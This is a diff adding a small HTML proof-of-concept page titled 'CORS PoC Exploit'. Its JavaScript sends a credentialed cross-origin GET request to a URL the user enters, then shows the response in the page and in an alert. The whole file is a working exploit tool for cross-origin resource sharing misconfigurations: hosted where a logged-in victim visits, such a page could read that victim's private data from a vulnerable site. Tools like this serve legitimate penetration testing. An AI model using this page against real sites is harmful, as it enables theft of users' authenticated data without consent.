@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+    <head><title>CORS PoC Exploit</title></head>
+<body>
+
+
+<script type="text/javascript">
+    function cors(url_to_test) {
+        alert('value = ' + (document.getElementById("with_creds").value == 'true'));
+        var xhttp = new XMLHttpRequest();
+        xhttp.onreadystatechange = function() {
+            if(this.readyState == 4 && this.status == 200) {
+                document.getElementById("results").innerHTML = this.responseText;
+                alert(this.responseText);
+            }
+        };
+        xhttp.open('GET', url_to_test, true);
+        xhttp.withCredentials = (document.getElementById("with_creds").value == 'true');
+        xhttp.send();
+    }
+
+
+</script>
+
+
+<h1>CORS PoC Exploit</h1>
+<div id="demo">
+    <h2>Input</h2>
+    URL to test : <input type="text" id="url" style="width: 600px;" value=""><br>
+    WithCredentials : <select id="with_creds">
+        <option value="true">true</option>
+        <option value="false">false</option>
+    </select><br>
+    Exploit : <button type="button" onclick="cors(document.getElementById('url').value)">GET</button>
+</div>
+<div>
+    <h2>Results</h2>
+    <pre id="results">
+    </pre>
+</div>
+</body>
+</html>
